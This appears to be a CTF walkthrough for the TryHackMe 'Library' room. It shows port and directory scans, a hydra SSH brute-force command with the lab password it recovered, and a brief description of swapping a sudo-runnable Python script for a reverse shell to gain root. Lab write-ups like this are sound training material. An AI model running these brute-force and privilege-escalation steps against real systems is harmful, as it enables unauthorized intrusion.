---
title: Walkthrough - Library
published: true
---

Tags: Security.
Description: Boot2root machine for FIT and bsides guatemala CTF.
Difficulty: Easy
URL: [https://tryhackme.com/room/bsidesgtlibrary](https://tryhackme.com/room/bsidesgtlibrary)

* * *

## Notes

```
Discovered open port 22/tcp on 10.10.33.54
Discovered open port 80/tcp on 10.10.33.54
```

- `gobuster dir -u http://library.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -x txt --no-error`

```
/images               (Status: 301) [Size: 311] [--> http://library.thm/images/]
/robots.txt           (Status: 200) [Size: 33]     
```

- inside robots.txt

```
User-agent: rockyou 
Disallow: /
```

Nothing useful here.

We can use the username meliodas on the homepage to try to brute ssh.

- `hydra -l meliodas -P /usr/share/seclists/Passwords/rockyou.txt 10.10.33.54 ssh`

```
[22][ssh] host: 10.10.33.54   login: meliodas   password: iloveyou1
```

checking sudo -l we can see the user can run the python script as sudo so deleting the file and remaking a new one with a reverse shell lets us connect and collect our flags.

* * * 

## What is the content of root.txt?

![0xskar](/assets/library01.png)

* * * 

